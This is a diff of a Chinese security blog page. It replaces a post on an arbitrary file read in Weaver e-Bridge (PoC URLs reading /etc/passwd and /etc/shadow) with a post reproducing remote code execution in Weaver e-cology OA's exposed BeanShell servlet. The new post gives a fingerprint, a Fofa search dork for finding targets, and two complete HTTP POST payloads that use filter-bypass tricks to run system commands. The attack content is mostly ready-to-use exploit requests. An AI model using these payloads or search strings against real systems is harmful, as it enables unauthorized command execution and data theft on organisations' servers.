@@ -6,24 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>泛微云桥任意文件读取漏洞复现 | biubiubiu~blog</title>
+  <title>泛微OA代码执行漏洞复现 | biubiubiu~blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="摘要泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。">
+  <meta name="description" content="摘要2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="泛微云桥任意文件读取漏洞复现">
-<meta property="og:url" content="http://yoursite.com/2021/03/09/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html">
+<meta property="og:title" content="泛微OA代码执行漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2021/03/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%B3%9B%E5%BE%AEOA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="biubiubiu~blog">
-<meta property="og:description" content="摘要泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。">
+<meta property="og:description" content="摘要2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309102947265.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309103031267.png">
-<meta property="article:published_time" content="2021-03-09T02:22:00.000Z">
-<meta property="article:modified_time" content="2021-03-09T03:16:19.793Z">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309112355795.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309111935258.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309112221884.png">
+<meta property="article:published_time" content="2021-03-09T03:15:00.000Z">
+<meta property="article:modified_time" content="2021-03-09T07:38:03.054Z">
 <meta property="article:author" content="biubiubiu~blog">
-<meta property="article:tag" content="EXP">
-<meta property="article:tag" content="泛微云桥">
+<meta property="article:tag" content="exp">
+<meta property="article:tag" content="泛微OA">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309102947265.png">
+<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309112355795.png">
   
     <link rel="alternative" href="/atom.xml" title="biubiubiu~blog" type="application/atom+xml">
   
@@ -149,20 +150,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-泛微云桥任意文件读取" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-漏洞复现-泛微OA代码执行" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      泛微云桥任意文件读取漏洞复现
+      泛微OA代码执行漏洞复现
     </h1>
   
 
         
-        <a href="/2021/03/09/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="archive-article-date">
-  	<time datetime="2021-03-09T02:22:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-09</time>
+        <a href="/2021/03/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%B3%9B%E5%BE%AEOA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="archive-article-date">
+  	<time datetime="2021-03-09T03:15:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-09</time>
 </a>
         
     
@@ -178,19 +179,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。</p>
+        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p>
 <a id="more"></a>
 
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><strong>影响版本：2018~2019几乎全版本</strong></p>
-<p>利用如下POC获取ID</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;XXX&#x2F;wxjsapi&#x2F;saveYZJFile?fileName&#x3D;test&amp;downloadUrl&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password&amp;fileExt&#x3D;txt</span><br></pre></td></tr></table></figure>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h5 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: ecology_JSessionId&#x3D;ecology&#x2F;weaver&#x2F;bsh.servlet.BshServlet</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309102947265.png" alt="image-20210309102947265"></p>
-<p>利用如下POC读取文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;XXX&#x2F;file&#x2F;fileNoLogin&#x2F;253b93fc641f4612879ecd9dfbd1df86</span><br></pre></td></tr></table></figure>
+<h5 id="Fofa-Dork"><a href="#Fofa-Dork" class="headerlink" title="Fofa Dork"></a>Fofa Dork</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app&#x3D;&quot;泛微-协同办公OA&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309103031267.png" alt="image-20210309103031267"></p>
-<p>同理可读取/etc/shadow文件内容可成功读取，说明该服务以高权限用户启动（可以尝试破解hash），并且这里可以只读取目录造成目录遍历，可通过目录遍历配合读取文件~你懂的。</p>
+<p>可以先通过GET URL来确认是否存在漏洞，存在界面如下，不存在会报其他错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;XXXX&#x2F;weaver&#x2F;bsh.servlet.BshServlet</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309112355795.png" alt="image-20210309112355795"></p>
+<h5 id="漏洞利用一"><a href="#漏洞利用一" class="headerlink" title="漏洞利用一"></a>漏洞利用一</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;weaver&#x2F;bsh.servlet.BshServlet HTTP&#x2F;1.1</span><br><span class="line">Host: XXX:80</span><br><span class="line">Content-Length: 100</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;XXX:80</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.82 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;39.82.235.26:8081&#x2F;weaver&#x2F;bsh.servlet.BshServlet</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;abcTzJIUGZOPw7CR22uGx; testBanCookie&#x3D;test</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">bsh.script&#x3D;eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr&#x3D;true&amp;bsh.servlet.output&#x3D;raw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309111935258.png" alt="image-20210309111935258"></p>
+<h5 id="漏洞利用二"><a href="#漏洞利用二" class="headerlink" title="漏洞利用二"></a>漏洞利用二</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;weaver&#x2F;bsh.servlet.BshServlet HTTP&#x2F;1.1</span><br><span class="line">Host: XXX:80</span><br><span class="line">Content-Length: 92</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;XXX:80</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.82 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;39.82.235.26:8081&#x2F;weaver&#x2F;bsh.servlet.BshServlet</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;abcTzJIUGZOPw7CR22uGx; testBanCookie&#x3D;test</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">bsh.script&#x3D;ex\u0065c(&quot;cmd &#x2F;c whoami&quot;);&amp;bsh.servlet.captureOutErr&#x3D;true&amp;bsh.servlet.output&#x3D;raw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20210309112221884.png" alt="image-20210309112221884"></p>
 
       
 
@@ -204,11 +209,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">EXP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">exp</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">泛微云桥</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">泛微OA</a>
         		</li>
       		
 		</ul>
@@ -279,7 +284,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/03/09/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/03/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%B3%9B%E5%BE%AEOA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -293,18 +298,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/03/09/%E6%B3%9B%E5%BE%AEOA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/03/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Springboot%E8%B5%84%E6%96%99/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          泛微OA代码执行漏洞复现
+          Spring Boot Vulnerability Exploit CheckList
         
       </div>
     </a>
   
   
-    <a href="/2021/03/05/CobaltStrike%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CobaltStrike去除特征</div>
+    <a href="/2021/03/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">泛微云桥任意文件读取漏洞复现</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -335,8 +340,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2021/03/09/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/", 
-    sourceId: "泛微云桥任意文件读取",
+    url: "http://yoursite.com/2021/03/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%B3%9B%E5%BE%AEOA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/", 
+    sourceId: "漏洞复现-泛微OA代码执行",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
@@ -479,43 +484,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">OllyDbg</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Apereo CAS</a>
+                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">exp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">EXP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">泛微OA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞修复</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">泛微云桥</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CVE-2018-8715</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">APPWeb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -527,11 +500,35 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">shiro反序列</a>
+                <a href="javascript:void(0)" class="js-tag color1">Apereo CAS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">thinkphp</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Spring Boot</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">泛微云桥</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">OllyDbg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE-2018-8715</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">APPWeb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞修复</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -547,7 +544,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">thinkphp</a>
+                <a href="javascript:void(0)" class="js-tag color5">泛微OA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">shiro反序列</a>
               </li>
             
             <div class="clearfix"></div>
